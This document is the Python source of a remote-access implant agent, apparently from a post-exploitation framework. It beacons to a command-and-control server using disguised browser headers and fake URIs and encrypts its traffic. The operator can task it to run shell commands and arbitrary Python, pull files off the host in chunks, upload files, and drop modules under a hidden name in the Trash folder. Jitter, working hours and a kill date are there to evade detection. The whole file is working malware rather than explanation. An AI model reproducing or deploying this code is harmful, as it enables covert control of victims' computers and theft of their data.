import struct, time, base64, subprocess, random, time, datetime
from os.path import expanduser
from StringIO import StringIO
from threading import Thread
import os

################################################
#
# agent configuration information
#
################################################

# print "starting agent"

# profile format ->
#   tasking uris | user agent | additional header 1 | additional header 2 | ...
profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

if server.endswith("/"): server = server[0:-1]

delay = 60
jitter = 0.0
lostLimit = 60
missedCheckins = 0

# killDate form -> "MO/DAY/YEAR"
killDate = "" 
# workingHours form -> "9:00-17:00"
workingHours = ""

parts = profile.split("|")
taskURIs = parts[0].split(",")
userAgent = parts[1]
headersRaw = parts[2:]

defaultPage = base64.b64decode("")

jobs = []

# global header dictionary
#   sessionID is set by stager.py
headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]
        
        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass


################################################
#
# communication methods
#
################################################

def sendMessage(packets=None):
    """
    Requests a tasking or posts data to a randomized tasking URI.

    If packets == None, the agent GETs a tasking from the control server.
    If packets != None, the agent encrypts the passed packets and 
        POSTs the data to the control server.
    """
    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = "".join(packets)
        data = aes_encrypt_then_hmac(key, data)       

    taskURI = random.sample(taskURIs, 1)[0]
    if (server.endswith(".php")):
        # if we have a redirector host already
        requestUri = server
    else:
        requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ("200", data)
    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, "")
    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, "")

    return ("","")


################################################
#
# encryption methods
#
################################################

def encodePacket(taskingID, packetData):
    """
    Encode a response packet.

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
    """

    # packetData = packetData.encode('utf-8').strip()

    taskID = struct.pack('=L', taskingID)
    counter = struct.pack('=L', 0)
    if(packetData):
        length = struct.pack('=L',len(packetData))
    else:
        length = struct.pack('=L',0)
    
    # b64data = base64.b64encode(packetData)

    if(packetData):
        packetData = packetData.decode('ascii', 'ignore').encode('ascii')

    return taskID + counter + length + packetData


def decodePacket(packet, offset=0):
    """
    Parse a tasking packet, returning (PACKET_TYPE, counter, length, data, REMAINING_PACKETES)

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
        [Y...]    - remainingData (possibly nested packet)
    """

    try:
        responseID = struct.unpack('=L', packet[0+offset:4+offset])[0]
        counter = struct.unpack('=L', packet[4+offset:8+offset])[0]
        length = struct.unpack('=L', packet[8+offset:12+offset])[0]
        # data = base64.b64decode(packet[12+offset:12+offset+length])
        data = packet[12+offset:12+offset+length]
        remainingData = packet[12+offset+length:]
        return (responseID, counter, length, data, remainingData)
    except Exception as e:
        print "decodePacket exception:",e
        return (None, None, None, None, None)


def processTasking(data):
    # processes an encrypted data packet
    #   -decrypts/verifies the response to get
    #   -extracts the packets and processes each

    try:
        tasking = aes_decrypt_and_verify(key, data)
        (taskingID, counter, length, data, remainingData) = decodePacket(tasking)

        # if we get to this point, we have a legit tasking so reset missedCheckins
        missedCheckins = 0

        # execute/process the packets and get any response
        resultPackets = ""
        result = processPacket(taskingID, data)
        if result:
            resultPackets += result

        packetOffset = 12 + length

        while remainingData and remainingData != "":

            (taskingID, counter, length, data, remainingData) = decodePacket(tasking, offset=packetOffset)

            result = processPacket(taskingID, data)
            if result:
                resultPackets += result

            packetOffset += 12 + length

        sendMessage(resultPackets)

    except Exception as e:
        print "processTasking exception:",e
        pass

def processJobTasking(result):
    # process job data packets
    #  - returns to the C2
    # execute/process the packets and get any response
    try:
        resultPackets = ""
        if result:
            resultPackets += result
        # send packets
        sendMessage(resultPackets)
    except Exception as e:
        print "processTasking exception:",e
        pass

def processPacket(taskingID, data):

    try:
        taskingID = int(taskingID)
    except Exception as e:
        return None

    if taskingID == 1:
        # sysinfo request
        # get_sysinfo should be exposed from stager.py
        return encodePacket(1, get_sysinfo())

    elif taskingID == 2:
        # agent exit
        
        msg = "[!] Agent %s exiting" %(sessionID)
        sendMessage(encodePacket(2, msg))
        exit() # does this kill all threads?

    elif taskingID == 40:
        # run a command
        resultData = str(run_command(data))
        return encodePacket(40, resultData)

    elif taskingID == 41:
        # file download

        filePath = os.path.abspath(data)
        if not os.path.exists(filePath):
            return encodePacket(40, "file does not exist or cannot be accessed")

        offset = 0
        size = os.path.getsize(filePath)

        while True:

            partIndex = 0

            # get 512kb of the given file starting at the specified offset
            encodedPart = get_file_part(filePath, offset)

            partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)

            if not encodedPart or encodedPart == '':
                break

            sendMessage(encodePacket(41, partData))

            global delay
            global jitter
            if jitter < 0: jitter = -jitter
            if jitter > 1: jitter = 1/jitter

            minSleep = (1.0-jitter)*delay
            maxSleep = (1.0+jitter)*delay
            sleepTime = random.randint(minSleep, maxSleep)
            time.sleep(sleepTime)

            partIndex += 1
            offset += 5120000

    elif taskingID == 42:
        # file upload

        parts = data.split("|")
        filePath = parts[0]
        base64part = parts[1]

        raw = base64.b64decode(base64part)
        f = open(filePath, 'ab')
        f.write(raw)
        f.close()

        try:
            sendMessage(encodePacket(42, "[*] Upload of %s successful" %(filePath) ))
        except:
            sendMessage(encodePacket(0, "[!] Error in writing file %s during upload" %(filePath) ))

    elif taskingID == 50:
        # return the currently running jobs
        msg = ""
        
        if len(jobs) == 0:
            msg = "No active jobs"
        else:
            msg = "Active jobs:\n"
            for x in xrange(len(jobs)):
                msg += "\t%s" %(x)
        
        return encodePacket(50, msg )

    elif taskingID == 51:
        # stop and remove a specified job if it's running
        try:
            result = jobs[int(data)].join()
            jobs[int(data)]._Thread__stop()
            if result and result != "":
                sendMessage(encodePacket(51, result ))
        except:
            return encodePacket(0, "error stopping job: %s" %(data))

    elif taskingID == 100:
        # dynamic code execution, wait for output, don't save outputPicl
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in {}
            sys.stdout = sys.__stdout__
            results = buffer.getvalue()
            return encodePacket(100, str(results))
        except Exception as e:
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData))

    elif taskingID == 101:
        # dynamic code execution, wait for output, save output
        prefix = data[0:15].strip()
        extension = data[15:20].strip()
        data = data[20:]

        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in {}
            sys.stdout = sys.__stdout__
            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
        except:
            # Also return partial code that has been executed 
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data")

    elif taskingID == 102:
        # on disk code execution for modules that require multiprocessing not supported by exec
        try:
            implantHome = expanduser("~") + '/.Trash/'
            moduleName = ".mac-debug-data"
            implantPath = implantHome + moduleName
            result = "[*] Module disk path: %s \n" %(implantPath) 
            with open(implantPath, 'w') as f:
                f.write(data)
            result += "[*] Module properly dropped to disk \n"
            pythonCommand = "python %s" %(implantPath)
            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
            data = process.communicate()
            result += data[0].strip()
            try:
                os.remove(implantPath)
                result += "\n[*] Module path was properly removed: %s" %(implantPath) 
            except Exception as e:
                print "error removing module filed: %s" %(e)
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                result += "\n\nError removing module file, please verify path: " + str(implantPath)
            return encodePacket(100, str(result))
        except Exception as e:
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                return encodePacket(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath))
            return encodePacket(0, "error executing specified Python data: %s" %(e))

    elif taskingID == 110:
        start_job(data)
        return encodePacket(110, "job %s started" %(len(jobs)-1))
        
    elif taskingID == 111:
        # TASK_CMD_JOB_SAVE
        # TODO: implement job structure
        pass
    
    else:
        return encodePacket(0, "invalid tasking ID: %s" %(taskingID))


################################################
#
# misc methods
#
################################################

def indent(lines, amount=4, ch=' '):
    padding = amount * ch
    return padding + ('\n'+padding).join(lines.split('\n'))


# from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None
    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)
    def join(self):
        Thread.join(self)
        return self._return


def start_job(code):
    
    global jobs

    # create a new code block with a defined method name
    codeBlock = "def method():\n" + indent(code)

    # register the code block
    code_obj = compile(codeBlock, '<string>', 'exec')
    # code needs to be in the global listing
    # not the locals() scope
    exec code_obj in globals()
    
    # create/start/return the thread
    # call the job_func so sys data can be cpatured
    codeThread = ThreadWithReturnValue(target=job_func, args=())
    codeThread.start()
    
    jobs.append(codeThread)

def job_func():
    try:
        old_stdout = sys.stdout  
        sys.stdout = mystdout = StringIO()
        # now call the function required 
        # and capture the output via sys
        method()
        sys.stdout = old_stdout
        dataStats_2 = mystdout.getvalue()
        result = encodePacket(110, str(dataStats_2))
        processJobTasking(result)
    except Exception as e:
        p = "error executing specified Python job data: " + str(e)
        result = encodePacket(0, p)
        processJobTasking(result)

# additional implementation methods
def run_command(command):
    command = command.split()
    p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    return ''.join(list(iter(p.stdout.readline, b'')))


def get_file_part(filePath, offset=0, chunkSize=512000):

    if not os.path.exists(filePath):
        return ''

    f = open(filePath, 'rb')
    f.seek(offset, 1)
    data = f.read(chunkSize)
    f.close()

    return base64.b64encode(data)


################################################
#
# main agent functionality
#
################################################

while(True):

    # TODO: jobs functionality

    if workingHours != "":
        try:
            start,end = workingHours.split("-")
            now = datetime.datetime.now()
            startTime = datetime.datetime.strptime(start, "%H:%M")
            endTime = datetime.datetime.strptime(end, "%H:%M")

            if not (startTime <= now <= endTime):
                sleepTime = startTime - now
                # print "not in working hours, sleeping %s seconds" %(sleepTime.seconds)
                # sleep until the start of the next window
                time.sleep(sleepTime.seconds)

        except Exception as e:
            pass

    # check if we're past the killdate for this agent
    #   killDate form -> MO/DAY/YEAR
    if killDate != "":
        now = datetime.datetime.now().date()
        killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
        if now > killDateTime:
            msg = "[!] Agent %s exiting" %(sessionID)
            sendMessage(encodePacket(2, msg))
            exit()

    # exit if we miss commnicating with the server enough times
    if missedCheckins >= lostLimit:
        exit()

    # sleep for the randomized interval
    if jitter < 0: jitter = -jitter
    if jitter > 1: jitter = 1/jitter
    minSleep = (1.0-jitter)*delay
    maxSleep = (1.0+jitter)*delay
    
    sleepTime = random.randint(minSleep, maxSleep)
    time.sleep(sleepTime)

    (code, data) = sendMessage()
    if code == "200":
        if data == defaultPage:
            missedCheckins = 0
        else:
            processTasking(data)
    else:
        pass
        # print "invalid code:",code

